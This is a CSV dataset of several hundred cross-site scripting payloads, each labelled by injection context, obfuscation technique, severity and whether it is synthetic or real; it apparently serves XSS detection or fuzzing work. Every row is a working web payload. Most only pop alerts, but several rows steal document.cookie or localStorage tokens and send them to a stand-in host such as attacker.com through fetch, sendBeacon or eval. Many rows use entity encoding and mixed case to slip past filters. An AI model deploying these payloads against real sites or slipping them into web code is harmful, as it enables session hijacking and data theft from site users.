payload,context,technique,severity,length,source
"' ><svG oNbeForEpaSte=prOmpT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
' oncopy=confirm(location.hash) ',attribute_escape,synthetic,medium,33,synthetic
"""%3E%3Cimg src=x oninvalid=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
""" onpoint&#101;rc&#97;nc&#101;l=prompt(1) """,attribute_escape,synthetic,medium,43,synthetic
"<div draggable=""true"" contenteditable>drag me</div><input2 ondragover=alert(1) contenteditable style=display:block>drop here</input2>",tag_injection,none,medium,133,real
`><img src=x onpageswap=alert(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
`><img src=x onwheel=prompt(location.hash)>,attribute_escape,synthetic,medium,43,synthetic
"""><img src=x oncut=confirm('XSS')>",attribute_escape,synthetic,medium,34,synthetic
ondrop=confirm(document.domain),event_handler,synthetic,medium,31,synthetic
`><Img srC=x onTouChsTarT=cOnfIrm('XSS')>,attribute_escape,synthetic,medium,41,synthetic
"\"" onpopstate=alert(1)//",attribute_escape,synthetic,medium,24,synthetic
<select	onpromptdismiss=console.log(1)>,tag_injection,synthetic,medium,39,synthetic
onh&#97;shch&#97;ng&#101;=&#97;l&#101;rt/**/('XSS'),event_handler,synthetic,low,51,synthetic
"__proto__[""oninput""]=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)",dom_sink,synthetic,low,61,synthetic
<svg><pre onload=alert(1)></pre>,tag_injection,none,medium,32,real
' oNdrAgsTarT=cOnsOle.loG(dOcuMenT.dOmaIn) ',attribute_escape,synthetic,medium,44,synthetic
"<sup oncut=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",tag_injection,none,medium,57,real
"	onmozfullscreenchange=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
onsubmit=alert/**/(location.hash),event_handler,synthetic,low,33,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>"")",dom_sink,synthetic,low,95,synthetic
"&quot; onanimationend=\u0061lert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,72,synthetic
<script>//alert(location.hash)</script>,script_injection,synthetic,medium,39,synthetic
"' onanimationcancel=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,63,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:consol&#101;.log('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,low,121,synthetic
"\' OnaNimAtiOneNd=ConFirM(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,58,synthetic
<embed onpointerup=alert(1) style=display:block>AnonKryptiQuz</embed>,tag_injection,none,medium,69,real
"window[""\u0061lert""](document.cookie)",dom_sink,synthetic,high,37,synthetic
"__proto__[""onst&#97;ll&#101;d""]=consol&#101;.log(1)",dom_sink,synthetic,low,51,synthetic
%3Cscript x=y onkeydown=confirm(document.domain)%3E,tag_injection,synthetic,medium,51,synthetic
<noscript/onb&#101;for&#101;m&#97;tch=consol&#101;.log('XSS')>,tag_injection,synthetic,low,62,synthetic
'><img src=x onmousedown=confirm(document.domain)>,attribute_escape,synthetic,medium,50,synthetic
""" oninv&#97;lid=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,low,58,synthetic
""" onpromptdismiss=alert('XSS') """,attribute_escape,synthetic,medium,32,synthetic
	ontr&#97;nsitionrun=&#97;l&#101;rt(1),event_handler,synthetic,low,38,synthetic
<svg onpromptdismiss=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,59,synthetic
"OnbEfoRecOpy=alErt&#40;STriNg.FroMChArCOde(88,83,83)&#41;",event_handler,synthetic,high,57,synthetic
<input4 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
<taBle x=Y oNmoZfuLlsCreEncHanGe=ConFirM(1)>,tag_injection,synthetic,medium,44,synthetic
"<meta onmouseenter=""alert(1)"">AnonKryptiQuz</meta>",tag_injection,none,medium,50,real
"ondrop=j&#97;v&#97;script:confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,73,synthetic
"`%3E%3Cimg src=x oninvalid=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,67,synthetic
eval(%22eval(%27//attacker.com/?c=%27+document.cookie)%22),dom_sink,synthetic,high,58,synthetic
%2sscript%2ualert()%2s/script%2u,generic,none,medium,32,real
"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;",generic,html_entity,high,113,real
"<img src=""abc"" onerror=""alert(1)"">",tag_injection,none,medium,34,real
"<ol onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",tag_injection,none,medium,66,real
\' OndBlcLicK=cOnsOle.loG(lOcaTioN.hAsh)//,attribute_escape,synthetic,medium,42,synthetic
"SetIntErvAl(""coNfiRm(DocUmeNt.CooKie)"",100)",dom_sink,synthetic,high,43,synthetic
onanimationstart=javascript:\u0061lert('XSS'),event_handler,synthetic,low,45,synthetic
"""{EVENTHANDLER}=alert(1)",attribute_escape,none,medium,24,real
"OnmOusEwhEel=prOmpT&#40;StrIng.frOmCHarCodE(88,83,83)&#41;",event_handler,synthetic,high,58,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>"")",dom_sink,synthetic,high,105,synthetic
<samp onpointerup=alert(1) style=display:block>AnonKryptiQuz</samp>,tag_injection,none,medium,67,real
""" %3E%3Csvg oncanplay=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,67,synthetic
"LocAtiOn.HreF=""JavAscRipT:aLerT(dOcuMenT.cOokIe)""",dom_sink,synthetic,high,49,synthetic
<diAloG x=y OneNdeD=cOnsOle.loG(1)>,tag_injection,synthetic,medium,35,synthetic
"<summary onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,75,real
<x onxxx=1 onxxx=1,tag_injection,none,low,18,real
"<time draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</time>",tag_injection,none,medium,81,real
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,tag_injection,none,medium,64,real
"onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler,synthetic,low,95,synthetic
 onp&#97;st&#101;=&#97;l&#101;rt(1),event_handler,synthetic,low,35,synthetic
%22 ><svg ontouchmove=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,41,synthetic
"' ><svg onanimationstart=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=print()></plaintext>",tag_injection,none,low,120,real
<script>eval(‘a\x6cert(1)’);</script>,dom_sink,encoding,low,37,real
A” autofocus onfocus=alert(“XSS”)//,event_handler,none,medium,35,real
"<video onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,69,real
"""><img src=x onpointerrawupdate=prompt('XSS')>",attribute_escape,synthetic,medium,46,synthetic
<img/src=x alt=confirm(1) onmouseover=eval(alt)>,dom_sink,encoding,medium,48,real
' ><svg ong&#101;stur&#101;&#101;nd=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,60,synthetic
 onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,70,synthetic
"<del onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</del>",tag_injection,none,medium,79,real
"<style>:target {color:red;}</style><small id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></small>",tag_injection,none,medium,114,real
"<IMG SRC=""jav&#x09;ascript:alert(7333);"">",attribute_escape,html_entity|whitespace_obfuscation|case_variation,medium,41,real
"<center draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</center>",tag_injection,none,medium,90,real
"onclos&#101;=&#97;l&#101;rt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler,synthetic,low,75,synthetic
' ><svg onmous&#101;ov&#101;r=prompt(1)>,attribute_escape,synthetic,medium,40,synthetic
""" ><svG oNwhEel=prOmpT('XSS')>",attribute_escape,synthetic,medium,30,synthetic
"""%3E%3Cimg src=x onmouseup=prompt(document.domain)%3E",attribute_escape,synthetic,medium,53,synthetic
<tr onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<object oncontextmenu=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,55,real
"document.body.innerHTML=""%3Cimg src=x onerror=eval(document.cookie+'&loc='+location.href)%3E""",dom_sink,synthetic,high,93,synthetic
""" %3E%3Csvg onreset=console.log('XSS')%3E",attribute_escape,synthetic,medium,41,synthetic
[#alert document.domain /],template_injection,synthetic,low,26,synthetic
"<output draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</output>",tag_injection,none,medium,88,real
""" ><svg onpointerdown=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
"j&#97;v&#97;	script:consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,low,76,synthetic
\' onpause=confirm(document.domain)//,attribute_escape,synthetic,medium,37,synthetic
<listing onkeyup=\u0061lert(location.hash)>,tag_injection,synthetic,low,43,synthetic
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",tag_injection,none,medium,107,real
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,tag_injection,none,medium,61,real
"s&#101;tInt&#101;rv&#97;l(""&#101;v&#97;l(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"",100)",dom_sink,synthetic,low,147,synthetic
"""><script+src=""https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)""></script>",script_injection,none,medium,130,real
"\"" ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//",attribute_escape,synthetic,low,59,synthetic
"""%3E%3Cimg src=x ongotpointercapture=prompt('XSS')%3E",attribute_escape,synthetic,medium,53,synthetic
' oNbeForEmaTch=coNfiRm(1) ',attribute_escape,synthetic,medium,28,synthetic
"<BASE HREF=""javascript:alert('AnonKryptiQuz');//"">",js_uri,case_variation,medium,50,real
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=pRomPt(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)>""",dom_sink,synthetic,high,91,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onclos&#101;"":prompt})",dom_sink,synthetic,low,54,synthetic
	onw&#97;iting=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,54,synthetic
%3Caudio onplay=console.log(1) onplay=console.log(1)%3E,tag_injection,synthetic,medium,55,synthetic
OnpOinTerCanCel=coNsoLe.Log/***/(1),event_handler,synthetic,low,35,synthetic
<form x=y onpagereveal=console.log(location.hash)>,tag_injection,synthetic,medium,50,synthetic
"<style>:target {color:red;}</style><i id=x style=""transition:color 1s"" ontransitionend=alert(1)></i>",tag_injection,none,medium,100,real
"<thead draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,88,real
<svg><picture onload=alert(1)></picture>,tag_injection,none,medium,40,real
"""><t&#97;bl&#101; onmozfullscr&#101;&#101;nch&#97;ng&#101;=confirm(1)>",tag_injection,synthetic,medium,70,synthetic
 onpause=console.log(location.hash),event_handler,synthetic,medium,35,synthetic
%3Canimatemotion ondblclick=console.log(1)/%3E,tag_injection,synthetic,medium,46,synthetic
j&#97;vascript:\u0061lert(document.domain),js_uri,synthetic,low,42,synthetic
"""%3E%3Cimg src=x oncanplay=confirm(location.hash)%3E",attribute_escape,synthetic,medium,52,synthetic
""" ><svg onpromptdismiss=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,57,synthetic
\' OnwEbkItaNimAtiOneNd=ConSolE.lOg(DocUmeNt.DomAin)//,attribute_escape,synthetic,medium,54,synthetic
""" ><svg on&#101;nd&#101;d=&#97;l&#101;rt(1)>",attribute_escape,synthetic,low,44,synthetic
"""><Img srC=x onFulLscReeNchAngE=aLerT(lOcaTioN.hAsh)>",attribute_escape,synthetic,medium,53,synthetic
><s %2b cript>alert(document.cookie)</script>,dom_sink,url_encoding,high,45,real
%22 onauxclick=confirm(location.hash) %22,attribute_escape,synthetic,medium,41,synthetic
"__pRotO__[""oNclOse""]=ProMpt(doCumEnt.coOkiE)",dom_sink,synthetic,high,44,synthetic
"document.body.innerHTML=%22<img src=x onerror=fetch(String.fromCharCode(88,83,83))>%22",dom_sink,synthetic,high,86,synthetic
""" oNpoPstAte=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape,synthetic,high,53,synthetic
<scRipT>/X/pRomPt('XSS')</sCriPt>,script_injection,synthetic,medium,33,synthetic
\' onfocusout=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape,synthetic,medium,46,synthetic
"""><Img srC=x onSelEct=coNsoLe.Log(loCatIon.haSh)>",attribute_escape,synthetic,medium,49,synthetic
"<menuitem id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></menuitem>",tag_injection,none,medium,92,real
<nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>,tag_injection,none,medium,72,real
OnfOcuSouT=jAvaScrIpt:alErt('XSS'),event_handler,synthetic,medium,34,synthetic
<dt onpointerenter=alert(1) style=display:block>AnonKryptiQuz</dt>,tag_injection,none,medium,66,real
%3Cmath src=x onmouseup=console.log(document.domain)%3E,tag_injection,synthetic,medium,55,synthetic
"setTimeout(%22console.log(1)%22,0)",dom_sink,synthetic,medium,34,synthetic
<tr/ons&#101;l&#101;ct=consol&#101;.log(1)>,tag_injection,synthetic,low,43,synthetic
"<command draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</command>",tag_injection,none,medium,70,real
&quot; onreset=alert(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,40,synthetic
"<isindex onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</isindex>",tag_injection,none,medium,71,real
<strike onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
' ><svG oNfoCus=alErt(1)>,attribute_escape,synthetic,medium,25,synthetic
"<blockquote draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",tag_injection,none,medium,97,real
&quOt; onPoiNteRraWupDatE=aLerT('XSS') X=&QuoT;,attribute_escape,synthetic,medium,47,synthetic
<!--><t&#101;mpl&#97;t&#101; onclos&#101;=consol&#101;.log(1)>,tag_injection,synthetic,low,62,synthetic
"<scRipT>sEtTImeOut('cOnsOle.loG(dOcuMenT.dOmaIn)',0)</ScrIpt>",script_injection,synthetic,medium,61,synthetic
'><img src=x onscrollsnapchange=alert(1)>,attribute_escape,synthetic,medium,41,synthetic
<noscr	ipt x=y onpaste=confirm(location.hash)>,tag_injection,synthetic,medium,46,synthetic
<seT	oNenD=aLerT(1)>,tag_injection,synthetic,medium,20,synthetic
"setInterval(""\u0061lert(btoa(document.cookie))"",100)",dom_sink,synthetic,high,52,synthetic
OnbLur=alErt(doCumEnt.doMaiN),event_handler,synthetic,medium,29,synthetic
"<a href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</a>",js_uri,html_entity|comment_injection|url_encoding,medium,198,real
""" ondragover=prompt(1) """,attribute_escape,synthetic,medium,24,synthetic
<div x=y onpause=confirm(location.hash)>,tag_injection,synthetic,medium,40,synthetic
""" ><svg onsearch=confirm(1)>",attribute_escape,synthetic,medium,28,synthetic
"""><t&#101;mpl&#97;t&#101; onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,94,synthetic
""" onwheel=prompt('XSS') """,attribute_escape,synthetic,medium,25,synthetic
<img onerror=a&#x06c;ert(1) src=a>,tag_injection,html_entity,low,34,real
"""><img src=x onprompt&#97;ction=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,80,synthetic
"<xmp draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",tag_injection,none,medium,84,real
<button popovertarget=x>Click me</button><input4 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</input4>,tag_injection,none,medium,108,real
<&#97;nim&#97;t&#101;motion ong&#101;stur&#101;st&#97;rt=confirm(1)>,tag_injection,synthetic,medium,68,synthetic
<noscr	ipt	ongesturestart=alert('XSS')>,tag_injection,synthetic,medium,39,synthetic
<w contenteditable id=x onfocus=alert()>,tag_injection,none,medium,40,real
onauxclick=prompt/**/('XSS'),event_handler,synthetic,low,28,synthetic
""" ><svG oNweBkiTanImaTioNenD=cOnsOle.loG(dOcuMenT.dOmaIn)>",attribute_escape,synthetic,medium,58,synthetic
"<sup onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",tag_injection,none,medium,61,real
%22 ><svg onpagereveal=alert(location.hash)>,attribute_escape,synthetic,medium,44,synthetic
<obJecT x=y OntOucHstArt=coNsoLe.Log(loCatIon.haSh)>,tag_injection,synthetic,medium,52,synthetic
"<font onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</font>",tag_injection,none,medium,69,real
"<area onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></area>",tag_injection,none,medium,281,real
"<noembed draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,87,real
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""&#97;l&#101;rt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"")",dom_sink,synthetic,low,132,synthetic
<embed src=/ onload=alert(1)>,tag_injection,none,medium,29,real
document.querySelector(%22body%22).innerHTML+=%22console.log(%27XSS%27)%22,dom_sink,synthetic,high,74,synthetic
"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",tag_injection,none,medium,107,real
"Obj&#101;ct.&#97;ssign(window,{""oncut"":prompt})",dom_sink,synthetic,low,47,synthetic
<liStiNg OnpOpsTatE=pRomPt(DocUmeNt.DomAin) oNpoPstAte=prOmpT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,79,synthetic
"Obj&#101;ct.&#97;ssign(window,{""on&#101;nd"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,70,synthetic
on&#101;nd=j&#97;v&#97;script:consol&#101;.log(1),event_handler,synthetic,low,49,synthetic
<header id=x tabindex=1 onactivate=alert(1)></header>,tag_injection,none,medium,53,real
"perl -e ';print "";&;<;SCR\0IPT>;alert("";XSS"";)<;/SCR\0IPT>;"";;'; >; out",generic,none,medium,71,real
"""><img src=x ontouchstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
"' %3E%3Csvg onreset=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,59,synthetic
<textarea onscrollend=\u0061lert('XSS')/>,tag_injection,synthetic,low,41,synthetic
<svg onload=prompt%26%230000000040document.domain)>,dom_sink,url_encoding,low,51,real
